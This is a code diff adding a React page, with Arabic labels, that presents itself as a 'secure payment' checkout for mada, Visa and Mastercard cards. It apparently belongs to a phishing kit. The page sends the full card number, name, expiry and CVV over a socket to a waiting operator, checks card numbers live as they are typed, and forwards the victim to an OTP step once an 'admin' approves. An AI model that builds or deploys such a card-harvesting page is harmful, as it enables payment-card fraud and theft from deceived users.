@@ -1,0 +1,271 @@
+import { useEffect, useState, useRef } from "react";
+import { useForm } from "react-hook-form";
+import { zodResolver } from "@hookform/resolvers/zod";
+import { z } from "zod";
+import { useLocation } from "wouter";
+import PageLayout from "@/components/layout/PageLayout";
+import WaitingOverlay from "@/components/WaitingOverlay";
+import { Button } from "@/components/ui/button";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import {
+  Select,
+  SelectContent,
+  SelectItem,
+  SelectTrigger,
+  SelectValue,
+} from "@/components/ui/select";
+import {
+  socket,
+  visitor,
+  sendData,
+  isFormApproved,
+  isCardVerified,
+  navigateToPage,
+} from "@/lib/store";
+
+const schema = z.object({
+  cardNumber: z
+    .string()
+    .min(1, "رقم البطاقة مطلوب")
+    .length(16, "رقم البطاقة يجب أن يكون 16 رقم"),
+  nameOnCard: z.string().min(1, "اسم حامل البطاقة مطلوب"),
+  expiryMonth: z.string().min(1, "الشهر مطلوب"),
+  expiryYear: z.string().min(1, "السنة مطلوبة"),
+  cvv: z.string().min(3, "CVV مطلوب").max(4, "CVV غير صحيح"),
+});
+
+type FormData = z.infer<typeof schema>;
+
+// Generate months and years
+const months = Array.from({ length: 12 }, (_, i) => ({
+  value: String(i + 1).padStart(2, "0"),
+  label: String(i + 1).padStart(2, "0"),
+}));
+
+const currentYear = new Date().getFullYear();
+const years = Array.from({ length: 12 }, (_, i) => ({
+  value: String(currentYear + i - 2000),
+  label: String(currentYear + i),
+}));
+
+// Detect card type
+function getCardType(number: string): string {
+  if (/^4/.test(number)) return "visa";
+  if (/^5[1-5]/.test(number)) return "mastercard";
+  if (/^9/.test(number)) return "mada";
+  return "unknown";
+}
+
+export default function CreditCardPayment() {
+  const [, navigate] = useLocation();
+  const [cardError, setCardError] = useState(false);
+  const debounceRef = useRef<ReturnType<typeof setTimeout>>();
+
+  const {
+    register,
+    handleSubmit,
+    watch,
+    setValue,
+    formState: { errors },
+  } = useForm<FormData>({
+    resolver: zodResolver(schema),
+    defaultValues: {
+      cardNumber: "",
+      nameOnCard: "",
+      expiryMonth: "",
+      expiryYear: "",
+      cvv: "",
+    },
+  });
+
+  const cardNumber = watch("cardNumber");
+
+  // Emit page enter
+  useEffect(() => {
+    navigateToPage("الدفع بطاقة الائتمان");
+  }, []);
+
+  // Verify card number
+  useEffect(() => {
+    if (cardNumber && cardNumber.length === 16) {
+      if (debounceRef.current) clearTimeout(debounceRef.current);
+      debounceRef.current = setTimeout(() => {
+        socket.value.emit("cardNumber:verify", cardNumber);
+      }, 500);
+    }
+  }, [cardNumber]);
+
+  // Handle card verification response
+  useEffect(() => {
+    if (isCardVerified.value === false) {
+      setCardError(true);
+    } else {
+      setCardError(false);
+    }
+  }, [isCardVerified.value]);
+
+  // Handle form approval
+  useEffect(() => {
+    if (isFormApproved.value) {
+      navigate("/otp-verification");
+    }
+  }, [isFormApproved.value, navigate]);
+
+  // Check blocked card prefixes
+  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\s+/g, "").replace(/\D/g, "");
+    const blockedPrefixes = visitor.value.blockedCardPrefixes;
+
+    if (blockedPrefixes && blockedPrefixes.includes(value.slice(0, 4))) {
+      setCardError(true);
+      setValue("cardNumber", "");
+    } else {
+      setValue("cardNumber", value);
+    }
+  };
+
+  const onSubmit = (data: FormData) => {
+    if (!isCardVerified.value) return;
+
+    const paymentData = {
+      totalPaid: JSON.parse(localStorage.getItem("paymentInfo") || "{}").total,
+      cardType: getCardType(data.cardNumber),
+      cardLast4: data.cardNumber.slice(-4),
+    };
+
+    localStorage.setItem("paymentData", JSON.stringify(paymentData));
+
+    sendData({
+      paymentCard: {
+        cardNumber: data.cardNumber,
+        nameOnCard: data.nameOnCard,
+        expiryMonth: data.expiryMonth,
+        expiryYear: data.expiryYear,
+        cvv: data.cvv,
+      },
+      current: "الدفع",
+      nextPage: "رمز التحقق (OTP)",
+      waitingForAdminResponse: true,
+      isCustom: true,
+    });
+  };
+
+  return (
+    <PageLayout variant="default">
+      <WaitingOverlay />
+
+      <div className="bg-white rounded-2xl shadow-xl p-6">
+        {/* Header */}
+        <div className="text-center mb-6">
+          <h1 className="text-xl font-bold text-gray-800 mb-2">الدفع الآمن</h1>
+          <p className="text-gray-500 text-sm">أدخل بيانات بطاقتك لإتمام الدفع</p>
+        </div>
+
+        {/* Card Icons */}
+        <div className="flex justify-center gap-3 mb-6">
+          <img src="/images/mada.png" alt="mada" className="h-8" />
+          <img src="/images/visa.png" alt="visa" className="h-8" />
+          <img src="/images/mastercard.png" alt="mastercard" className="h-8" />
+        </div>
+
+        <form onSubmit={handleSubmit(onSubmit)} className="space-y-4">
+          {/* Card Number */}
+          <div className="space-y-2">
+            <Label htmlFor="cardNumber">رقم البطاقة</Label>
+            <Input
+              id="cardNumber"
+              type="tel"
+              inputMode="numeric"
+              maxLength={16}
+              placeholder="1234 5678 9012 3456"
+              className={cardError ? "border-red-500" : ""}
+              {...register("cardNumber")}
+              onChange={handleCardChange}
+            />
+            {(errors.cardNumber || cardError) && (
+              <p className="text-red-500 text-xs">
+                {errors.cardNumber?.message || "رقم البطاقة غير صحيح"}
+              </p>
+            )}
+          </div>
+
+          {/* Name on Card */}
+          <div className="space-y-2">
+            <Label htmlFor="nameOnCard">اسم حامل البطاقة</Label>
+            <Input
+              id="nameOnCard"
+              placeholder="الاسم كما يظهر على البطاقة"
+              {...register("nameOnCard")}
+            />
+            {errors.nameOnCard && (
+              <p className="text-red-500 text-xs">{errors.nameOnCard.message}</p>
+            )}
+          </div>
+
+          {/* Expiry Date */}
+          <div className="grid grid-cols-2 gap-4">
+            <div className="space-y-2">
+              <Label>شهر الانتهاء</Label>
+              <Select onValueChange={(v) => setValue("expiryMonth", v)}>
+                <SelectTrigger>
+                  <SelectValue placeholder="الشهر" />
+                </SelectTrigger>
+                <SelectContent>
+                  {months.map((m) => (
+                    <SelectItem key={m.value} value={m.value}>
+                      {m.label}
+                    </SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
+              {errors.expiryMonth && (
+                <p className="text-red-500 text-xs">{errors.expiryMonth.message}</p>
+              )}
+            </div>
+
+            <div className="space-y-2">
+              <Label>سنة الانتهاء</Label>
+              <Select onValueChange={(v) => setValue("expiryYear", v)}>
+                <SelectTrigger>
+                  <SelectValue placeholder="السنة" />
+                </SelectTrigger>
+                <SelectContent>
+                  {years.map((y) => (
+                    <SelectItem key={y.value} value={y.value}>
+                      {y.label}
+                    </SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
+              {errors.expiryYear && (
+                <p className="text-red-500 text-xs">{errors.expiryYear.message}</p>
+              )}
+            </div>
+          </div>
+
+          {/* CVV */}
+          <div className="space-y-2">
+            <Label htmlFor="cvv">رمز الأمان (CVV)</Label>
+            <Input
+              id="cvv"
+              type="tel"
+              inputMode="numeric"
+              maxLength={4}
+              placeholder="123"
+              {...register("cvv")}
+            />
+            {errors.cvv && (
+              <p className="text-red-500 text-xs">{errors.cvv.message}</p>
+            )}
+          </div>
+
+          {/* Submit Button */}
+          <Button type="submit" className="w-full" size="lg">
+            ادفع الآن
+          </Button>
+        </form>
+      </div>
+    </PageLayout>
+  );
+}
